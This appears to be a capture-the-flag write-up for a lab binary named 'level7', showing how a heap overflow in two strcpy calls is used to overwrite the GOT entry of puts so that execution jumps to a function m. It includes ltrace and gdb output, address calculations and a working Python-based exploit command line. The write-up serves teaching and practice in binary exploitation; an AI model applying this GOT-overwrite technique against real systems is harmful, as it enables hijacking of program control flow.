In the [code](./source.c), we can observe two `malloc` for defining two arrays in which there is another `malloc`'ed pointer.
The pointers are used as the target destination in `strcpy`. We will use a buffer overflow in the first argument to write over the destination of the second call.

## Investigation

1) We need to know the address returned by `malloc`.
    ```bash
    $ ltrace ./level7
    malloc(8)                                                                 = 0x0804a008
    malloc(8)                                                                 = 0x0804a018
    malloc(8)                                                                 = 0x0804a028
    malloc(8)                                                                 = 0x0804a038
    ```
    The addresses returned by malloc start at `0x0804a008`.
    We can observe the value stored there.
    ```
    (gdb) b *0x080485f7
    (gdb) r aaaa bbbb
    (gdb) x/20xw 0x0804a000
    0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018 <- address where the first argument is write
    0x804a010:      0x00000000      0x00000011      0x61616161      0x00000000
    0x804a020:      0x00000000      0x00000011      0x00000002      0x0804a038 <- address where the second argument is write
    0x804a030:      0x00000000      0x00000011      0x62626262      0x00000000
    0x804a040:      0x00000000      0x00020fc1      0xfbad240c      0x00000000
    ```
    So the first input is located at `0x804a018` and the second pointer at `0x804a02c` with an offset of `0x804a02c - 0x804a018 = 0x14 = 0d20`.

2) We need the address of `puts` to replace it with the address of `m`.
    ```bash
    (gdb) disas 'puts@plt'
    Dump of assembler code for function puts@plt:
       0x08048400 <+0>:     jmp    *0x8049928
       0x08048406 <+6>:     push   $0x28
       0x0804840b <+11>:    jmp    0x80483a0
    End of assembler dump.
    ```
    The address of `puts` is `0x8049928`.

3) Finally we will need the address of `m`
    ```bash
    (gdb) i fun m
    ...
    0x080484f4  m
    ...
    ```
    The function `m` is located at `0x080484f4`.

## Exploit

In the first input, we will need to write 20 chars then the address of `puts` to enable the second input to be written there with the address of `m`.

The exploit will look like this
```shell
./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```
